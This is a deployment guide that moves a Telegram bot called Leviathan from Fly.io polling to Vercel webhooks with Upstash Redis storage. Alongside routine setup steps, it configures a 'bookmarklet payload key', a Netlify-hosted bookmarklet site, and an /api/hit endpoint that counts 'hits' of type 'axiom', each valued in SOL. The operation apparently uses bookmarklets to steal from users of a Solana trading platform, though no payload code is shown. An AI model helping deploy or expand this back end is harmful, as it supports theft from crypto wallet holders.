# Leviathan Bot Migration to Vercel (Webhook Mode)

## Overview
This guide covers migrating the Telegram bot from polling (Fly.io) to webhook mode on Vercel with persistent state in Upstash Redis.

## Benefits
- ✅ **No always-on VM billing** — Vercel free tier handles requests on-demand
- ✅ **Persistent user data** — Redis keeps wallets, stats, and balances across restarts
- ✅ **24/7 availability** — Telegram sends updates to your webhook endpoint
- ✅ **Fast cold starts** — Vercel optimized for serverless functions

## Prerequisites
1. Vercel account (free) — https://vercel.com
2. Upstash account (free tier) — https://upstash.com
3. Bot token from BotFather (already have)
4. Bookmarklet payload key (already configured)

## Step 1: Set Up Upstash Redis

1. Go to https://upstash.com/login and sign in.
2. Create a new **Redis Database**:
   - Name: `leviathan-bot` (or similar)
   - Region: Select closest to your users
   - Plan: **Free** (10,000 commands/day, plenty for this bot)
3. Once created, click the database and copy:
   - `UPSTASH_REDIS_REST_URL` (starts with `https://`)
   - `UPSTASH_REDIS_REST_TOKEN` (your auth token)
4. Save these — you'll need them for Vercel environment variables.

## Step 2: Prepare Vercel Deployment

### 2a. Connect GitHub repo to Vercel (recommended)
1. Go to https://vercel.com/dashboard
2. Click "Add New..." → "Project"
3. Import your GitHub repository (or upload folder manually)
4. Select project root folder (the one with `package.json` and `api/` folder)

### 2b. Add Environment Variables
In Vercel project settings, go to **Settings** → **Environment Variables** and add:

```
BOT_TOKEN = <your telegram bot token>
BOOKMARKLET_PAYLOAD_KEY = 9f4d3a2b7e8c1d5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9
BOOKMARKLET_SITE_URL = https://velox-xxx.netlify.app
UPSTASH_REDIS_REST_URL = <from Upstash step 1>
UPSTASH_REDIS_REST_TOKEN = <from Upstash step 1>
HIT_VALUE_SOL = 0.001
```

## Step 3: Deploy to Vercel

### Option A: Automatic (GitHub)
1. In Vercel dashboard, after importing the repo, click **Deploy**.
2. Vercel will build and deploy automatically.
3. Wait for deployment to complete (check "Deployments" tab).
4. Copy your deployment URL (e.g., `https://leviathan-bot-xxx.vercel.app`)

### Option B: Manual (CLI)
```bash
npm install -g vercel
vercel login
vercel --prod
```

## Step 4: Register Telegram Webhook

Once deployed, register the webhook with Telegram so it sends updates to your endpoint.

Replace `YOUR_VERCEL_URL` and `YOUR_BOT_TOKEN`:

```bash
curl -X POST https://api.telegram.org/botYOUR_BOT_TOKEN/setWebhook \
  -d url=https://YOUR_VERCEL_URL/api/telegram
```

**Example:**
```bash
curl -X POST https://api.telegram.org/bot123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11/setWebhook \
  -d url=https://leviathan-bot-abc123.vercel.app/api/telegram
```

Verify webhook is set:
```bash
curl https://api.telegram.org/botYOUR_BOT_TOKEN/getWebhookInfo
```

Expected response:
```json
{
  "ok": true,
  "result": {
    "url": "https://YOUR_VERCEL_URL/api/telegram",
    "has_custom_certificate": false,
    "pending_update_count": 0
  }
}
```

## Step 5: Test the Bot

1. Open Telegram and find your bot (e.g., @leviathan_bot)
2. Send `/start` — should show language selection
3. Select a language → bot should prompt for wallet
4. Enter a valid Solana address
5. Send `/stats` — should show your profile (all fresh from Redis)
6. Send `/menu` — should show menu options

If nothing happens:
- Check Vercel **Function Logs** tab in the deployment
- Look for errors in the webhook endpoint (`/api/telegram`)
- Verify `BOT_TOKEN` and Redis environment variables are correct

## Step 6: Bookmarklet & Hit Tracking

The `/api/hit` endpoint receives hits from bookmarklets. Test:

```bash
curl "https://YOUR_VERCEL_URL/api/hit?type=axiom&code=USER_ID&username=test&botId=AXIOM"
```

Expected: `{ "success": true }`

## Step 7: Update Bookmarklet Host (Optional)

If you're serving bookmarklets from your Vercel URL instead of Netlify:

In Telegram, send to bot:
```
/setbookmarkleturl https://YOUR_VERCEL_URL
```

Or set env var:
```
BOOKMARKLET_SITE_URL = https://YOUR_VERCEL_URL
```

Redeploy on Vercel to apply.

## Troubleshooting

### Webhook Failures
- **"Missing BOT_TOKEN"**: Check environment variables on Vercel are set correctly.
- **"UPSTASH connection failed"**: Verify Redis URL and token are correct (no extra spaces).
- **"Connection timeout"**: Upstash free tier may have brief latency; retries are automatic.

### User Data Lost
- Check Upstash dashboard to confirm database is active and has data.
- Use Upstash CLI to inspect keys: `upstash redis get leviathan:user:USER_ID`

### Slow Cold Starts
- Vercel cold starts (~1-2s) are normal. Telegram retries automatically if your endpoint takes >5s.
- Consider upgrading to Vercel Pro for faster function initialization (optional).

## Rollback to Polling (if needed)

If you want to revert to Fly polling:
1. Disable the Telegram webhook: `curl -X POST https://api.telegram.org/botYOUR_BOT_TOKEN/deleteWebhook`
2. Deploy the polling version back to Fly (restore `bot.js` in-memory mode)
3. Migrate Redis data back to memory or keep Redis for state persistence

## Additional Notes

- **Data Retention**: Upstash free tier retains data indefinitely (no expiry).
- **Scaling**: Vercel free tier handles 1M function invocations/month; plenty for a mid-sized bot.
- **Costs**: Both Vercel (free) and Upstash (free tier) should have zero cost for typical usage.
- **Security**: Keep `BOT_TOKEN` and Redis tokens secret; never commit to Git (use `.env` locally, Vercel secrets in prod).

## Next Steps

After migration:
1. Monitor bot usage in Vercel Function Logs.
2. Check Upstash dashboard for Redis key usage.
3. Announce the new bot URL if you changed it.
4. Optional: Add more admin commands or features.

For support, contact the repository owner or check Vercel and Upstash documentation.
